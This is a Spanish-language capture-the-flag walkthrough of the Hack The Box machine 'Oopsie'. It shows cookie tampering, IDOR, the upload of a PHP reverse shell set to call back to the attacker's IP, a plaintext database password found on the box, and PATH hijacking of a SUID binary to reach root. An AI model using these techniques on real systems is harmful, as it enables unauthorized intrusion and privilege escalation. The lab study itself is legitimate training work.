![[Pasted image 20260704143447.png]]
Ese es el concepto general: una herramienta que actúa de intermediaria entre tu navegador y el servidor, interceptando el tráfico. Burp Suite es _un_ proxy, pero la respuesta que busca la pregunta es el término genérico.

![[Pasted image 20260704144553.png]]
![[Pasted image 20260704144604.png]]

En el navegador, en `http://10.129.76.237/`, haz clic derecho → **"Ver código fuente de la página"** (o `Ctrl+U`). Busca ahí dentro (con `Ctrl+F`) palabras como `login`, `admin`, `cdn`, `panel`. ¿Ves algo?
Encontramos una linea con el cdn-cgi/login/script


![[Pasted image 20260704144853.png]]
La pregunta pregunta: ¿qué puedes **modificar en Firefox** para conseguir acceso a esa página? La respuesta es el concepto que ya vimos antes con Burp — algo que Firefox guarda sobre tu sesión y que el servidor usa para saber quién eres y qué rol tienes.

¿Recuerdas cómo se llama eso? Es lo mismo que viste en la máquina Vaccine cuando sacaste el `PHPSESSID` con F12 → Application → Storage


![[Pasted image 20260704145340.png]]

Intento 1 Fallido 

![[Pasted image 20260704145049.png]]
Esto es exactamente el **broken access control** que menciona la descripción de la máquina: el servidor decide qué puedes ver y hacer basándose simplemente en el **valor de una cookie que tú controlas desde tu propio navegador**. No hay ninguna validación seria en el servidor de "¿este usuario realmente tiene este rol en la base de datos?" — se fía ciegamente de lo que le dices en la cookie.

Piensa un momento antes de que sigamos: si el servidor confía en el valor de `role` para decidir tus permisos... ¿qué crees que pasaría si cambias ese valor directamente en el navegador, de `guest` a algo como `admin`? 🤔

Vamos a probarlo. En esa misma tabla de cookies:

1. Haz doble clic sobre el valor `guest` de la fila `role`
2. Bórralo y escribe `admin`
3. Pulsa Enter para guardar el cambio
4. Recarga la página (`F5`) y vuelve a intentar acceder a `Uploads`

Intento 2 Correcto
![[Pasted image 20260704145418.png]]

```
http://10.129.76.237/cdn-cgi/login/admin.php?content=accounts&id=2
```

Fíjate: el parámetro es `id=2`, pero la tabla te muestra el **Access ID `2233`** para el usuario `guest`. Esto sugiere que `id=2` en la URL es un identificador **interno/secuencial** distinto del "Access ID" que se guarda en la cookie `user`. Es decir, hay dos numeraciones distintas: una interna de la web (`id=1`, `id=2`, `id=3`...) y otra que es el "Access ID" que ves en la tabla (`2233` para el guest).

![[Pasted image 20260704145837.png]]

Tienes ahora **tres** cookies:

```
admin: 34322
role: guest
user: 2233
```


1. **Borra** la cookie llamada `admin` (clic derecho sobre ella → Delete, o selecciónala y pulsa la papelera si la ves)
2. **Edita** la cookie `user` — cambia su valor de `2233` a `34322`
3. **Edita** la cookie `role` — cambia su valor de `guest` a `admin`
4. Recarga la página y ve a `http://10.129.76.237/cdn-cgi/login/admin.php?content=uploads`


![[Pasted image 20260704150548.png]]

con el gobuster dir te aparecen y podemos ver donde estan
![[Pasted image 20260704150623.png]]

![[Pasted image 20260704153325.png]]
 FINALIDAD HACER LA SUBIDA DEL ARCHIVO PARA ENTRAR DENTRO
 
Ahora tenemos que hacer un reverse shell pero no como hicimos en otra máquina porque ahora es php asi que nos metemos dentro de nuestro shell.php que tiene predeterminado parrot lo copiamos en una carpeta shell.php y cambiamos los vlaores de ip y puerto por los nuestros
![[Pasted image 20260704152020.png]]

### Explicacion del cambio de ip y port


#### ¿Por qué cambiamos `$ip` y `$port` en el archivo?

Recuerda el concepto de reverse shell: la máquina víctima **se conecta hacia ti**, no al revés. Para que eso funcione, el código que se ejecute en la víctima necesita saber **a qué dirección conectarse** — igual que si le dieras a alguien un número de teléfono para que te llame.

El archivo `shell.php` que descargamos de Parrot (`/usr/share/webshells/php/php-reverse-shell.php`) es un script **genérico**, hecho para que cualquier persona lo use en cualquier máquina. Por eso, tal como venía, tenía valores de ejemplo puestos a mano:

php

```php
$ip = '127.0.0.1';   // esto significa "conéctate a mí mismo" - no sirve para nada real
$port = 1234;         // un puerto cualquiera de ejemplo
```

`127.0.0.1` es la dirección de "loopback" — significa "esta misma máquina". Si dejáramos eso tal cual y lo subiéramos a la máquina víctima, el script intentaría conectarse **a sí mismo** (a la propia máquina Oopsie), no a ti. Eso no serviría de nada — nunca llegaría la conexión a tu Parrot.

Por eso tuvimos que **editar el script para poner TU IP real** (`10.10.16.126`, la de tu VPN de HTB) y el puerto donde vas a tener `nc` escuchando (`4444`). Así, cuando ese script se ejecute dentro de la máquina Oopsie, en vez de intentar conectarse a sí mismo, va a intentar conectarse a **tu** máquina — que es justo donde tienes `nc -lvnp 4444` esperando esa llamada

### continuacion

Subimos el archivos y lo abrimos una ventana PERO tenemos al nc escuchando 
![[Pasted image 20260704152528.png]]
![[Pasted image 20260704152634.png]]
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Ya estamos dentro del www-data
Ahora tenemos que ver donde estan los usuarios que en www-data se encuentran 
```
ls -la /var/www/html/
```

![[Pasted image 20260704153232.png]]![[Pasted image 20260704153212.png]]

![[Pasted image 20260704153507.png]]
![[Pasted image 20260705014542.png]]
![[Pasted image 20260705014557.png]]
("Establecer ID de Usuario" o "Establecer identificador de usuario") — es el nombre técnico del bit de permisos que hace que un programa se ejecute con los privilegios del propietario del archivo (en este caso `root`), en vez de con los privilegios de quien lo esté ejecutando.


Ese comando busca en todo el sistema (`/`) archivos cuyo grupo propietario sea `bugtracker`. Este tipo de comando suele usarse en la fase de enumeración para encontrar pistas sobre binarios o archivos relacionados con una escalada de privilegios (recuerda que la descripción de la máquina mencionaba un **SUID binary** al final).

![[Pasted image 20260704153745.png]]

![[Pasted image 20260705014900.png]]
![[Pasted image 20260705014851.png]]


![[Pasted image 20260705015348.png]]

![[Pasted image 20260704153921.png]]
Recuerda la task que respondiste hace un momento: _"What executable is run with the option `-group bugtracker` to identify all files owned by the bugtracker group?"_ — la propia pregunta del sistema HTB te estaba dando una pista enorme sobre el siguiente paso de la máquina, sin decírtelo de forma directa.

**El razonamiento es este**: en máquinas de escalada de privilegios, es muy común que exista un **grupo especial** en el sistema (aquí, `bugtracker`) que tenga permisos sobre ciertos archivos o programas concretos — normalmente un programa relacionado con alguna aplicación interna de la empresa ficticia (aquí "MegaCorp"). Si tu usuario (`robert`) pertenece a ese grupo, es probable que tengas acceso a ejecutar algún binario especial que los usuarios normales no pueden tocar.
![[Pasted image 20260704154049.png]]
### Explicacion SUID
####  ¿Qué significa el bit SUID?

Normalmente, cuando ejecutas un programa, este corre con **tus** propios privilegios de usuario. El bit SUID cambia esa regla: si está activado, el programa se ejecuta siempre con los privilegios del **propietario del archivo** — sin importar quién lo esté ejecutando.

Mira quién es el propietario: **`root`**. Esto significa que este binario, cuando lo ejecute cualquier usuario (incluido `robert`), va a correr **con los privilegios de root**, aunque tú sigas siendo `robert`. Es una forma legítima que usan los sistemas Linux para dejar que usuarios normales ejecuten ciertas tareas puntuales que normalmente requerirían ser root (por ejemplo, el comando `passwd` para cambiar tu propia contraseña usa SUID para poder escribir en `/etc/shadow`, que normalmente solo root puede tocar).

**El problema de seguridad** aparece cuando ese binario SUID hace algo mal internamente — por ejemplo, si llama a otro programa del sistema **sin especificar la ruta completa** (en vez de llamar a `/bin/ls`, simplemente llama a `ls`). Ahí es donde entra el concepto de la descripción: **PATH hijacking**.

### Continuacion
![[Pasted image 20260704154558.png]]
Buen resultado, y sale un aviso interesante: `WARNING: terminal is not fully functional` — esto pasa porque `less` necesita más funcionalidad de terminal de la que tenemos en esta shell. No pasa nada, ya tenemos suficiente información en lo que ha salido.

Fíjate en estas dos líneas de la lista:

```
strcpy
system
```

**`system`** es una función de C que ejecuta un comando del sistema operativo, tal como si lo escribieras en una terminal — esto confirma que el programa efectivamente llama a comandos externos internamente. Pero el `strings` que has sacado corta antes de llegar a ver cuál es exactamente ese comando (el texto se ha cortado en símbolos de librería, no en las cadenas de texto que usa el programa).

Vamos a buscarlo de forma más específica, sin `less` (para evitar el problema de terminal):

```
robert@oopsie:/$ strings /usr/bin/bugtracker | grep -i "cat\|bin\|search"
```

Esto filtra directamente las líneas que contengan `cat`, `bin` o `search` (palabras candidatas a ser el comando que buscamos). 
![[Pasted image 20260704154704.png]]
```
cat /root/reports/
```

Esto confirma exactamente lo que sospechábamos: el programa `bugtracker`, internamente, ejecuta el comando **`cat`** para leer un archivo de reportes (probablemente concatena esto con el número de bug que le des, tipo `cat /root/reports/1`, `cat /root/reports/2`, etc.)

Y aquí está la clave del fallo: fíjate que llama a `cat` **sin poner la ruta completa** (no dice `/bin/cat`, dice solo `cat`). Esto es exactamente lo que necesitábamos confirmar para el **PATH hijacking**.

### Ahora te explico el concepto a fondo, porque es genuinamente nuevo para ti

Cuando un programa en Linux ejecuta un comando **sin especificar su ruta completa** (como aquí, solo `cat` en vez de `/bin/cat`), el sistema operativo no sabe automáticamente dónde está ese programa — tiene que **buscarlo**. Para eso usa la variable de entorno `$PATH`, que es una lista de carpetas (separadas por `:`) donde el sistema busca, **en orden**, hasta encontrar un archivo ejecutable que se llame así.

![[Pasted image 20260704154815.png]]
Si tú, como usuario, puedes **modificar tu propio `$PATH`** para que apunte primero a una carpeta que tú controlas (por ejemplo, `/tmp`), y dentro de esa carpeta creas **tu propio archivo llamado `cat`** (que en realidad no es el `cat` de verdad, sino un script que tú has escrito, por ejemplo, que abre una shell), entonces quien ejecute el binario `bugtracker` va a acabar ejecutando **tu falso `cat`** en vez del verdadero.

Y aquí está la magia perversa: como `bugtracker` tiene el bit **SUID** (corre como root), cuando "ejecuta `cat`" y en realidad ejecuta **tu script falso**, ¡tu script se ejecuta con privilegios de **root**!

![[Pasted image 20260705015011.png]]
### FASE 1 — Encontrar el binario sospechoso

**¿Por qué buscamos algo relacionado con el grupo `bugtracker`?**

Antes de esta fase, una de las tasks de HTB te había hecho, literalmente, esta pregunta:

> _"What executable is run with the option `-group bugtracker`..."_

Esa pregunta, aunque parezca solo un cuestionario, en realidad es HTB **dándote una pista disfrazada**: te está diciendo "existe un grupo llamado `bugtracker` en el sistema, y hay algo interesante relacionado con él". La respuesta a esa pregunta era el comando `find` — así que lo usamos para buscar:

bash

```bash
find / -group bugtracker 2>/dev/null
```

Esto le dice al sistema: "recórrete TODO el sistema de archivos (`/`) y dime qué archivos tienen como grupo propietario `bugtracker`". El resultado fue un único archivo:

```
/usr/bin/bugtracker
```

---

### FASE 2 — Entender por qué ese binario es especial

Miramos sus permisos con `ls -la`:

```
-rwsr-xr-- 1 root bugtracker 8792 ... /usr/bin/bugtracker
```

Aquí tienes que fijarte en **dos cosas** de esa línea:

1. **La `s` en `rws`** (en vez de la `x` normal de "ejecutable"). Esa `s` es el bit **SUID**. Su significado: _"cuando alguien ejecute este programa, no correrá con los permisos de quien lo ejecuta — correrá con los permisos del propietario del archivo"_.
2. **El propietario es `root`** (lo ves justo después de los permisos: `root bugtracker`, el primer nombre es el usuario propietario, el segundo es el grupo propietario).

**Juntando 1 y 2**: da igual que lo ejecute `robert`, o `www-data`, o cualquiera — mientras tenga permiso para ejecutar el archivo (que sí lo tiene, porque `robert` pertenece al grupo `bugtracker`, y el grupo tiene permiso de lectura/ejecución `r-x`), el programa se va a ejecutar **como si fuera root**.

Esto por sí solo no es un fallo de seguridad — es una funcionalidad legítima de Linux (el mismo mecanismo que usa `passwd` para que puedas cambiar tu contraseña sin ser root). El problema viene de **qué hace** ese binario concreto por dentro.

---

### FASE 3 — Descubrir el fallo dentro del programa

Ejecutamos el programa una vez para ver qué hacía visualmente: nos pedía un "Bug ID" y, al meterle un número, presumiblemente buscaba y mostraba un reporte relacionado con ese ID.

Para saber **cómo** lo hacía por dentro, sin tener que desmontar el binario a mano (ingeniería inversa completa, que es mucho más complejo), usamos una herramienta sencilla:

bash

```bash
strings /usr/bin/bugtracker | grep -i "cat\|bin\|search"
```

`strings` extrae **todo el texto legible** que hay embebido dentro de un archivo binario (un ejecutable, por dentro, es código máquina ilegible para nosotros, pero suele contener también trocitos de texto — nombres de funciones que usa, mensajes de error, rutas de archivos, comandos que ejecuta, etc.). El `grep` simplemente filtra esa lista larguísima para quedarnos solo con las líneas que nos interesan.

El resultado clave fue:

```
cat /root/reports/
```

**¿Qué significa esto?** Que el programa, en algún punto de su ejecución, llama internamente al comando **`cat`** (el mismo que usas tú para leer archivos) para mostrar el contenido de un reporte guardado en `/root/reports/`. Probablemente concatena esto con el número que tú le diste (`cat /root/reports/1`, `cat /root/reports/2`, etc.)

**Aquí está el fallo real**: fíjate que el programa escribe solo `cat`, **no** `/bin/cat` (que sería la ruta completa y exacta de dónde está el `cat` de verdad en el sistema). Escribir solo el nombre, sin la ruta, es una mala práctica de programación — y es exactamente el hueco que vamos a explotar.

---

### FASE 4 — Entender el mecanismo de `$PATH` (esto es lo más nuevo, vamos despacio)

Cuando tú escribes un comando en una terminal, por ejemplo `ls`, o cuando un programa (como `bugtracker`) internamente pide ejecutar `cat`, el sistema operativo tiene que **encontrar** el archivo ejecutable correspondiente a ese nombre. ¿Cómo lo hace, si tú no le has dicho la ruta exacta?

Usa la variable de entorno **`$PATH`**. Puedes verla con:

bash

```bash
echo $PATH
```

Y verías algo como:

```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Esto es literalmente una **lista de carpetas**, separadas por `:`. Cuando el sistema necesita encontrar un comando llamado, por ejemplo, `cat`, va mirando **carpeta por carpeta, en ese orden exacto**:

1. ¿Existe `/usr/local/sbin/cat`? No.
2. ¿Existe `/usr/local/bin/cat`? No.
3. ¿Existe `/usr/sbin/cat`? No.
4. ¿Existe `/usr/bin/cat`? No.
5. ¿Existe `/sbin/cat`? No.
6. ¿Existe `/bin/cat`? **¡Sí!** → usa este.

Y ahí para de buscar, usando el primero que encuentra.

**La idea del ataque (PATH hijacking)**: si yo consigo que mi propia carpeta (donde YO controlo qué archivos hay) aparezca **antes** que `/bin` en esa lista, y dentro de mi carpeta pongo un archivo que también se llame `cat`... el sistema lo va a encontrar **a mí primero**, y nunca llegará a mirar el `/bin/cat` real, porque ya paró de buscar en el paso anterior.

---

### Los 4 comandos prácticos, explicados uno a uno

bash

```bash
mkdir /tmp/hijack
```

→ Creamos una carpeta que es completamente nuestra. `/tmp` es una carpeta donde cualquier usuario del sistema puede crear archivos y carpetas libremente (a diferencia de `/bin` o `/usr/bin`, que solo root puede modificar).

bash

```bash
echo '/bin/bash' > /tmp/hijack/cat
```

→ Creamos, dentro de esa carpeta, un archivo de texto llamado exactamente `cat` (mismo nombre que el comando real que queremos suplantar). El **contenido** de ese archivo es simplemente el texto `/bin/bash` — es decir, cuando algo "ejecute" este archivo, en realidad va a ejecutar la instrucción de abrir una shell de bash. Es como escribir un script de una sola línea.

bash

```bash
chmod +x /tmp/hijack/cat
```

→ Le damos permiso de **ejecución** a ese archivo. Sin esto, aunque el sistema lo encontrara, no podría "correrlo" como programa — se necesita este permiso explícito.

bash

```bash
export PATH=/tmp/hijack:$PATH
```

→ Este es el paso clave. `export` sirve para modificar una variable de entorno para tu sesión actual. Le decimos: "mi nuevo `$PATH` va a ser `/tmp/hijack` seguido de (`:`) todo lo que ya tenía antes (`$PATH`)". Esto pone nuestra carpeta **al principio** de la lista de búsqueda — así se busca ahí antes que en cualquier otro sitio.

---

### El momento de la verdad

Cuando ejecutamos otra vez:

bash

```bash
/usr/bin/bugtracker
```

Y le dimos un número de Bug ID, el programa internamente ejecutó su llamada a "cat". Como tu terminal (heredada por el propio programa cuando lo lanzas) tenía ese `$PATH` modificado, el sistema buscó `cat` y lo encontró **primero en `/tmp/hijack/cat`** — nuestro impostor, que en realidad es "abre una shell de bash".

Y aquí está la magia final: como `bugtracker` se estaba ejecutando **como root** (por el bit SUID que vimos en la Fase 2), el `/bin/bash` que lanza nuestro `cat` falso **también se ejecuta como root**, porque hereda los privilegios del proceso que lo lanzó.

Por eso, al comprobar con `whoami` después de meter el número del Bug ID, salió **`root`** — habíamos conseguido una shell completa con privilegios de administrador total del sistema.

---

### El pequeño lío final con las flags

Cuando intentaste leer `root.txt` con `cat root.txt`, no salía nada — porque **seguías teniendo tu `$PATH` hijackeado activo** en esa nueva shell de root (la hereda de la sesión anterior). Así que cuando escribías `cat`, el sistema seguía yendo primero a tu impostor (`/bin/bash`), en vez del `cat` real — por eso no veías ningún texto, solo se "abría otra bash" silenciosamente.

La solución fue usar la **ruta absoluta** del `cat` de verdad:

bash

```bash
/bin/cat /root.txt
```

Al especificar la ruta completa, el sistema no necesita buscar en `$PATH` en absoluto — vas directo al archivo correcto, sin que el hijacking interfiera.

![[Pasted image 20260705015132.png]]


```
robert@oopsie:/$ /usr/bin/bugtracker
```

Te va a pedir un "Bug ID" — mete cualquier número (por ejemplo `1`) y pulsa Enter. En ese momento, el programa va a intentar ejecutar `cat` internamente para mostrarte el reporte — y como tu `$PATH` modificado hace que encuentre primero tu `cat` falso (que es `/bin/bash`), deberías conseguir una shell.
![[Pasted image 20260705015421.png]]




## RESUMEN Qué hicimos y por qué, paso a paso

### 1. Enumeración inicial (nmap)

Solo dos puertos abiertos: **22 (SSH)** y **80 (HTTP)**. Como no teníamos credenciales SSH todavía, el punto de entrada obligado era el puerto 80 — la web.

### 2. Encontrar la página de login oculta

La página principal (`http://IP/`) era una landing normal de una empresa ficticia ("MegaCorp Automotive"), sin login visible. Miramos el **código fuente** de esa página (`Ctrl+U`) y encontramos una pista en el propio HTML:

```
src="/cdn-cgi/login/script.js"
```

Esa ruta `/cdn-cgi/login/` nos llevó directamente a un formulario de login que gobuster, con su wordlist genérica, no había encontrado (porque `cdn-cgi` no es un nombre típico de directorio a adivinar).

**Por qué funcionó**: mirar el código fuente es una técnica de enumeración pasiva — a veces los desarrolladores dejan rutas, comentarios o referencias a recursos que no están enlazados visiblemente en la página, pero sí existen en el código.

### 3. Login como invitado (Guest)

En esa página de login había una opción de "Login as Guest" — nos daba acceso limitado a la aplicación (un "Repair Management System"), pero con permisos reducidos (no podíamos ver `Uploads`, por ejemplo).

### 4. Descubrir el control de acceso roto (Broken Access Control)

Con F12 → Storage → Cookies, vimos que el navegador tenía guardadas dos cookies:

```
role: guest
user: 2233
```

**El fallo de seguridad**: la aplicación decide qué puedes ver y hacer basándose **únicamente en el valor de estas cookies**, que están completamente en tu navegador, bajo tu control. El servidor nunca verifica de forma robusta (por ejemplo, contra una sesión firmada criptográficamente, o comprobando en base de datos si ese usuario realmente tiene ese rol) — simplemente confía en lo que le dices.

Intentamos cambiar `role` a `admin` directamente, pero el sistema pedía "super admin rights" — así que el rol por sí solo no bastaba.

### 5. IDOR (Insecure Direct Object Reference) para encontrar el usuario correcto

En la sección `Account`, vimos una URL con un parámetro `id=` (`admin.php?content=accounts&id=2`). Al cambiar ese número a mano (`id=1`), la aplicación nos mostró información de **otro usuario** sin comprobar si teníamos permiso para verla — encontramos así un usuario `admin` con **Access ID `34322`**.

**Por qué funcionó**: esto es un IDOR clásico — el servidor usa un identificador secuencial y predecible en la URL para decidir qué información mostrar, sin verificar si el usuario que hace la petición tiene derecho a ver esos datos concretos.

### 6. Combinar ambos fallos para escalar a admin

Con esa pieza nueva, ajustamos las cookies correctamente:

```
user: 34322
role: admin
```

Esta vez sí nos dejó acceder a `Uploads` — la combinación exacta de "Access ID correcto" + "rol correcto" era lo que el servidor comprobaba (de forma insegura, porque todo era manipulable desde el cliente).

### 7. Subir una reverse shell en PHP

Con acceso a la página de subida de archivos, y sabiendo (por la descripción de la máquina) que no había validación de tipo de archivo, subimos un script PHP de reverse shell (`php-reverse-shell.php`, disponible en Parrot en `/usr/share/webshells/php/`), editado previamente para apuntar a nuestra IP de VPN y puerto de escucha.

**Por qué funcionó**: el servidor aceptó un archivo `.php` como si fuera una imagen de marca — sin comprobar la extensión ni el contenido. Como sabíamos que el archivo se guardaba en `/uploads/` (visto antes en el gobuster inicial), pudimos visitarlo directamente desde el navegador. Al visitarlo, Apache **ejecutó** ese código PHP (porque el servidor está configurado para interpretar cualquier `.php` que reciba, sin importar de dónde vino), y ese código se conectó a nuestro `nc` en escucha, dándonos una shell como el usuario `www-data` (el usuario con el que corre el servidor Apache).

### 8. Mejorar la shell a tty completa

Mismo truco que en Vaccine:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 9. Encontrar credenciales hardcodeadas para movimiento lateral

Buscamos archivos PHP en `/var/www/html/` y encontramos `db.php`, con la contraseña de conexión a la base de datos escrita directamente en el código:

php

```php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

Probamos esa misma contraseña para cambiar al usuario del sistema `robert` (con `su robert`), y funcionó — otro caso de **reutilización de contraseñas** entre distintos servicios/usuarios.

### 10. Encontrar el binario SUID vulnerable

La descripción de la máquina apuntaba a un grupo llamado `bugtracker`. Buscamos archivos pertenecientes a ese grupo:

```
find / -group bugtracker
```

Y encontramos `/usr/bin/bugtracker`, con permisos:

```
-rwsr-xr-- 1 root bugtracker ...
```

La `s` en los permisos del propietario indicaba el bit **SUID**: este programa siempre se ejecuta con los privilegios de su propietario (`root`), sin importar quién lo lance.

### 11. Analizar el binario para encontrar la llamada insegura

Con `strings` (que extrae texto legible de un binario), vimos que el programa internamente ejecutaba:

```
cat /root/reports/...
```

Sin especificar la ruta completa del comando `cat` (no decía `/bin/cat`).

### 12. PATH hijacking

Aprovechamos ese descuido:

1. Creamos una carpeta propia (`/tmp/hijack`)
2. Dentro, creamos un archivo llamado `cat` cuyo contenido era simplemente `/bin/bash`
3. Le dimos permisos de ejecución
4. Modificamos nuestra variable `$PATH` para que esa carpeta se buscara **primero**, antes que las carpetas del sistema donde está el `cat` real

Al ejecutar `/usr/bin/bugtracker` de nuevo, el programa (corriendo como root, por el SUID) intentó ejecutar "cat" — y el sistema, siguiendo nuestro `$PATH` modificado, ejecutó **nuestro impostor** en vez del real. Como el impostor era simplemente "abre bash", y el programa que lo lanzaba corría como root, terminamos con una **shell de root**.

### 13. Flags

- `user.txt` en `/home/robert/`
- `root.txt` en `/root/` (con cuidado de usar `/bin/cat` explícito, porque nuestro `$PATH` hijackeado seguía activo y afectaba también a nuestros propios comandos)